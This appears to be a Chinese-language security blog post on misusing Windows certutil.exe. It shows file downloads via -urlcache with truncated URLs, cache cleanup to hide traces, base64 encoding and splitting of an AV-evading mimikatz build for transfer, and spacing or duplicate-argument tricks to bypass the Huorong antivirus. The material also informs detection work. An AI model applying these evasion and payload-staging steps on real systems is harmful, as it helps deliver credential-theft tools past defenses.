# 1\. certutil介绍

`certutil.exe` 是一个合法`Windows`文件，用于管理`Windows`证书的程序。

官方的解释是： `certutil.exe`是一个命令行程序，作为证书服务的一部分安装。您可以使用`Certutil.exe`转储和显示证书颁发机构（`CA`）配置信息，配置证书服务，备份和还原`CA`组件以及验证证书，密钥对和证书链。

# 2\. 使用介绍

`certutil -?`的指令显示，当前可以做的东西非常的多：

![](../Images/7b4335b9604863b965cbcffe3b724bce.png "null")

## 2.1 文件下载

这个命令几乎是`certutil`使用最多的场景之一，在后面还会详细的介绍，首先在本地搭建一个`http`的服务：

![](../Images/22533d7a54cd8faf371bb33fa0d1b07c.png "null")

此时的下载命令就是：

```
certutil.exe -urlcache -split -f http://
```

![](../Images/7330e34e3a0e46dd9d070944e0158629.png "null")

使用certutil下载文件会产生缓存，用如下命令查看： `certutil -urlcache *`

![](../Images/5e48d7c17e4e074b364e94ebbcbf002c.png "null")

使用命令将当前的缓存删除：

```
certutil -urlcache * delete
```

![](../Images/7f57749c4faa58d9a8093e771bf7c9d8.png "null")

此时缓存已经删除 如果想以后下载文件不想要缓存的话，可以在下载文件结尾加上一个`delete`

```
certutil.exe -urlcache -split -f http://
```

## 2.2 hash验证

在`linux`下可以使用`md5`、`md5sum`等校验`hash`值

![](../Images/df8776b9bd15d8344ba426a047f20f64.png "null")

在`Windows`上就可以使用`certutil`来计算：

```




certutil -hashfile crow.txt MD5 //检验MD5
```

![](../Images/8266ddc0e9d5335d41fa631362cb3b4c.png "null")

## 2.3 base64加解密

在这篇文章里面作者使用`certutil`对大文件进行了编码传输，并在文件传输之后，将文件进行了还原。

他主要使用的就是使用`certutil`的`encode`和`decode`进行加解密。具体文章地址：https://xz.aliyun.com/t/9737

在这里我以自己以前做的免杀`mimikatz`复现一下。

首先将该文件使用`certutil`进行编码：

```
certutil -encode crowsec_bypass_mimikatz.exe m.txt
```

![](../Images/ce720d04999bb0e1039acdd860bba9fd.png "null")

将文件使用`notepad`打开，当前文件一共`9w`多行：

![](../Images/71409202a93bb3b34a63918e647e64ab.png "null")

按照作者的方法，我将文件分为3个：

![](../Images/4c32704b9f512a06a5722acff2aa2534.png "null")

使用`ctrl + g`进行快速定位：

![](../Images/c4e0b5e0ed00e6b02265cf5dec114716.png "null")

当前分割之后的文件分别为`1.txt ``2.txt` `3.txt`。

![](../Images/bcadf10df1703b59cc80b32f0a02db6a.png "null")

然后再使用命令将当前的文件下载过来：

```
certutil.exe -urlcache -split -f http://
```

![](../Images/551959ebdd91a34eafcaad5aa09ebdc4.png "null")

将3个文件合并到一个文件中去：

```
copy *.txt mimikatz.txt   //把当前目录下的所有txt合并为mimikatz.txt
```

![](../Images/ae4a47a1c7e4aab2f33b4e6e9434943a.png "null")

然后对文件进行编码：

```
certutil -decode mimikatz.txt m.exe
```

![](../Images/95586bd330be1cabc7bc1d38300d627e.png "null")

此时文件的`hash`值和原来的`hash`值相同：

![](../Images/38cfb2809af92e9fb25f6b56cfb456b4.png "null")

## 3.1 火绒（已失效）

环境：`windows7` + `最新版火绒` 直接执行命令：

```
certutil -urlcache  -split -f http://
```

![](../Images/8532c09f455b6ff99a251bc9ec55eb10.png "null")

文件都下载下来了，火绒没有对此进行拦截，那如果下载一个`exe`呢？在这里下载一个`cmd.exe`试试：

```
certutil -urlcache  -split -f http://
```

![](../Images/d16f791e625a551aed77d0200f095a06.png "null")

我的火绒没有对此进行任何的拦截操作。。。。

后来才发现，原来是我的空格问题，我在`-spilt`之前多空了一格：

```
空格两个，bypass 火绒：certutil -urlcache  -split -f http://
```

![](../Images/c766a9bbb33bce479d8f42caa2e709ac.png "null")

### 多余空格

所以`bypass`的方法就很多了，最简单的就是多空一格：

不过可以在火绒中加上任意多余的参数：

```
certutil -urlcache -f -split -f http://
```
